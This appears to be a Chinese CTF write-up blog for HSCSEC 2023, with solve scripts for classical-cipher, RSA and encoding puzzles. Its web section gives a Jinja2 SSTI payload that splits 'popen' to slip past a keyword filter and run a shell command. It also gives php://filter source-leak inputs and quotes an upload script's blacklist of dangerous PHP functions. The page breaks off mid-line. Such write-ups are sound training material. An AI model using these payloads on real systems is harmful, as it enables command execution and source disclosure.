<h1 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h1><h2 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这应该是八卦图和一个空字组成的一种进制数  因为一共有九个符号所以应该是九进制的数</span></span><br><span class="line"><span class="comment">#☲☵这两个符号应该是H的ASCII码的值72，又因为九进制的80等于十进制的72，所以☲:8,☵:0</span></span><br><span class="line"><span class="comment">#☷☵☳这三个符号应该是S的ASCII码值83,又因为九进制的102等于十进制的83，所以☷:1,☳:2</span></span><br><span class="line"><span class="comment">#☶空这两个符号应该是C的ASCII码值67，又因为九进制的74等于十进制的67，所以☶:7,空:4</span></span><br><span class="line"><span class="comment">#☷空☱这三个符号应该是&#123;的ASCII码值123，又因为九进制的146等于十进制的123，所以☱:6</span></span><br><span class="line"><span class="comment">#还剩3和5 ☰ ☴ 要么 ☴:3 要么☴:5</span></span><br><span class="line">c=<span class="string">&#x27;☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲&#x27;</span></span><br><span class="line"><span class="built_in">dict</span>=&#123;<span class="string">&#x27;☵&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;☷&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;☳&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;☴&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;空&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;☰&#x27;</span>:<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;☱&#x27;</span>:<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;☶&#x27;</span>:<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;☲&#x27;</span>:<span class="string">&#x27;8&#x27;</span>&#125;      <span class="comment">#正确的</span></span><br><span class="line"><span class="comment"># dict=&#123;&#x27;☵&#x27;:&#x27;0&#x27;,&#x27;☷&#x27;:&#x27;1&#x27;,&#x27;☳&#x27;:&#x27;2&#x27;,&#x27;☰&#x27;:&#x27;3&#x27;,&#x27;空&#x27;:&#x27;4&#x27;,&#x27;☴&#x27;:&#x27;5&#x27;,&#x27;☱&#x27;:&#x27;6&#x27;,&#x27;☶&#x27;:&#x27;7&#x27;,&#x27;☲&#x27;:&#x27;8&#x27;&#125;    #错误的</span></span><br><span class="line">c0=c.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c0:</span><br><span class="line">    m = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        m += <span class="built_in">dict</span>.get(j)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(m,<span class="number">9</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;Chinese_g0ssp&#125;  发现少个i手动加上   HSCSEC&#123;Chinese_g0ssip&#125;</span></span><br></pre></td></tr></table></figure>





<h2 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h2><p>通过搜索得到二十八星宿，又分为青龙，白虎，朱雀，玄武四大类每一类可以看成相同的一个数字</p>
<p>则这四类可以组成一个四进制的数字</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211220246475.png" alt="image-20230211220246475"></p>
<p>要把   壁水獝  改为   壁水貐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">qinglong=<span class="string">&#x27;角木蛟 亢金龙 氐土貉 房日兔 心月狐 尾火虎 箕水豹&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">zuque=<span class="string">&#x27;井木犴 鬼金羊 柳土獐 星日马 张月鹿 翼火蛇 轸水蚓&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">xuanwu=<span class="string">&#x27;斗木獬 牛金牛 女土蝠 虚日鼠 危月燕 室火猪 壁水貐&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">baihu=<span class="string">&#x27;奎木狼 娄金狗 胃土雉 昴日鸡 毕月乌 觜火猴 参水猿&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">c=<span class="string">&#x27;&#x27;&#x27;斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴</span></span><br><span class="line"><span class="string">虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐</span></span><br><span class="line"><span class="string">壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马</span></span><br><span class="line"><span class="string">虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓</span></span><br><span class="line"><span class="string">室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐</span></span><br><span class="line"><span class="string">牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌</span></span><br><span class="line"><span class="string">危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐</span></span><br><span class="line"><span class="string">斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡</span></span><br><span class="line"><span class="string">危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴</span></span><br><span class="line"><span class="string">牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎</span></span><br><span class="line"><span class="string">室火猪鬼金羊柳土獐壁水貐&#x27;&#x27;&#x27;</span></span><br><span class="line">c0=c.split()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c0:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        m.append(i[j*<span class="number">3</span>:j*<span class="number">3</span>+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> m:     <span class="comment">#这里不知道谁代表0，1，2，3 利用枚举尝试看那种组合可以得到正确结果</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> qinglong:</span><br><span class="line">            flag+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> zuque:</span><br><span class="line">            flag+=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> xuanwu:</span><br><span class="line">            flag+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> baihu:</span><br><span class="line">            flag+=<span class="string">&#x27;2&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag,<span class="number">4</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;CN_Ancient_AP&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># import gmpy2</span></span><br><span class="line"><span class="comment"># from flag import m</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># p = getPrime(1024)</span></span><br><span class="line"><span class="comment"># q = getPrime(1024)</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line"><span class="comment"># print(&#x27;n =&#x27;,n)</span></span><br><span class="line"><span class="comment"># e = 0x10001</span></span><br><span class="line"><span class="comment"># M = m * e * 1 * 2022 * p</span></span><br><span class="line"><span class="comment"># c = pow(M,e,n)</span></span><br><span class="line"><span class="comment"># print(&#x27;c =&#x27;,c)</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p=<span class="number">97772803605372749682605407399511947369112121674469942228369880617973442071629696563167801242512592723590571045910500244994517647412843880814748689241502769894657207751011999959509916975918486841422622984629059948050450554202252225537996289481828075394484142212703142883528182761865502541887744555480640923169</span></span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m//<span class="number">2022</span>//e//p)))</span><br><span class="line"><span class="comment">#flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># #!/bin/python3</span></span><br><span class="line"><span class="comment"># from Crypto.Util.number import bytes_to_long, getPrime</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># FLAG = &quot;*******************MASK****************&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # print(FLAG)</span></span><br><span class="line"><span class="comment"># number1 = getPrime(512)</span></span><br><span class="line"><span class="comment"># number2 = getPrime(1024)</span></span><br><span class="line"><span class="comment"># print(number1)</span></span><br><span class="line"><span class="comment"># result = FLAG * number1 % number2</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line"><span class="string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">number1=<span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">result=<span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line">m=result//number1</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;qMmZqWvmj70bBsCfmVLT&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># import flag</span></span><br><span class="line"><span class="comment"># alphabet = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line"><span class="comment"># key = &#x27;HSC&#x27;</span></span><br><span class="line"><span class="comment"># assert flag.startswith(&#x27;HSCSEC&#123;&#x27;)</span></span><br><span class="line"><span class="comment"># flag_num_list = []</span></span><br><span class="line"><span class="comment"># c = []</span></span><br><span class="line"><span class="comment"># for item in flag:</span></span><br><span class="line"><span class="comment">#     flag_num_list.append(alphabet.find(item) + 1)</span></span><br><span class="line"><span class="comment"># key_num = alphabet.find(key) + 1</span></span><br><span class="line"><span class="comment"># for i in flag_num_list:</span></span><br><span class="line"><span class="comment">#     m = (i + key_num) % 94 - 1</span></span><br><span class="line"><span class="comment">#     if m == 0:</span></span><br><span class="line"><span class="comment">#         c.append(&quot;□&quot;)</span></span><br><span class="line"><span class="comment">#     c.append(alphabet[m-1:m])</span></span><br><span class="line"><span class="comment"># print(&quot;c = &#123;&#125;&quot;.format(&#x27;&#x27;.join(c)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;HSC&#x27;</span></span><br><span class="line">key_num = alphabet.find(key) + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(key_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    m=alphabet.find(i) + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(alphabet[m],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212132309050.png" alt="image-20230212132309050"></p>
<p>进行到这一步的时候发现页面中显示  说明把popen和flag给过滤了</p>
<p>popen可以利用字符拼接绕过  flag可以通过 sort  fl*实现绕过</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212132617954.png" alt="image-20230212132617954"></p>
<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&quot;pop&quot;&quot;en&quot;](&#x27;sort /fl*&#x27;).read()&#125;&#125;                             </span><br></pre></td></tr></table></figure>

<p>HSCSEC{9a288ab6-fd07-48e9-981c-9badd98ae5a9}</p>
<p>或者tplmap</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230213142355361.png" alt="image-20230213142355361"></p>
<h2 id="EASYPHY"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h2><p>赛后看了大佬WP才看懂</p>
<p>首先就是利用php伪协议和base大小写绕过来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?acti0n=php://filter/read=convert.bAse64-encode/resource=upload.php</span><br><span class="line">?acti0n=php://filter/read=convert.bAse64-encode/resource=view.php</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span> = <span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span> = <span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span> = <span class="string">&quot;css/style.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span> = <span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>上传图片<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">&quot;text/javascript&quot;</span> <span class="attr">color</span> = <span class="string">&quot;0,0,255&quot;</span> <span class="attr">opacity</span> = <span class="string">&#x27;0.7&#x27;</span> <span class="attr">zIndex</span> = <span class="string">&quot;-2&quot;</span> <span class="attr">count</span> = <span class="string">&quot;99&quot;</span> <span class="attr">src</span> = <span class="string">&#x27;js/canvas-nest.min.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 动态背景 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span>&gt;</span>上传你手里最好的图片!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span> = <span class="string">&quot;comment&quot;</span>&gt;</span>If it is excellent enough, you will get the flag!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">&quot;form1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span> = <span class="string">&quot;post&quot;</span> <span class="attr">accept-charset</span> = <span class="string">&quot;utf-8&quot;</span> <span class="attr">enctype</span> = <span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span> <span class="attr">name</span> = <span class="string">&quot;title&quot;</span> <span class="attr">for</span> = <span class="string">&quot;file&quot;</span>&gt;</span>图片:   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;file&quot;</span> <span class="attr">name</span> = <span class="string">&quot;file&quot;</span> <span class="attr">id</span> = <span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;submit&quot;</span> <span class="attr">class</span> = <span class="string">&quot;button&quot;</span> <span class="attr">name</span> = <span class="string">&quot;submit&quot;</span> <span class="attr">value</span> = <span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">	error_reporting(0);</span></span><br><span class="line"><span class="meta">	$dir = &#x27;upload/&#x27;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]).&#x27;/&#x27;;</span></span><br><span class="line"><span class="meta">	if(!is_dir($dir)) &#123;</span></span><br><span class="line"><span class="meta">		if(!mkdir($dir, 0777, true)) &#123;</span></span><br><span class="line"><span class="meta">			echo error_get_last()[&#x27;message&#x27;];</span></span><br><span class="line"><span class="meta">			die(&#x27;Failed to make the directory&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">	&#125;</span></span><br><span class="line"><span class="meta">	chdir($dir);</span></span><br><span class="line"><span class="meta">	if(isset($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">		$name = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span></span><br><span class="line"><span class="meta">		$tmp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span></span><br><span class="line"><span class="meta">		$ans = exif_imagetype($tmp_name);</span></span><br><span class="line"><span class="meta">		if($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt;= 204800) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;filesize too big.&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(!$name) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;filename can not be empty!&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(htaccess)|(user)|(\.\.)|(00)|(#)/i&#x27;, $name) !== 0) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;Hacker!&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span></span><br><span class="line"><span class="meta">			$type = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;];</span></span><br><span class="line"><span class="meta">			if($type == &#x27;image/gif&#x27; or $type == &#x27;image/jpg&#x27; or $type == &#x27;image/png&#x27; or $type == &#x27;image/jpeg&#x27;) &#123;</span></span><br><span class="line"><span class="meta">				echo &quot;&lt;p align=\&quot;center\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">			&#125;</span></span><br><span class="line"><span class="meta">			echo(&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;);</span></span><br><span class="line"><span class="meta">			exit;</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		$content = file_get_contents($tmp_name);</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;, $content) !== 0) &#123;</span></span><br><span class="line"><span class="meta">			echo(&#x27;&lt;script&gt;alert(&quot;How dare you upload file with such dangerous function?&quot;)&lt;/script&gt;&#x27;);</span></span><br><span class="line"><span class="meta">			exit;</span></span><br><span class="line"><span class="meta">		&#125;		</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		$extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;, $extension) === 0) &#123;</span></span><br><span class="line"><span class="meta">			die(&quot;&lt;p 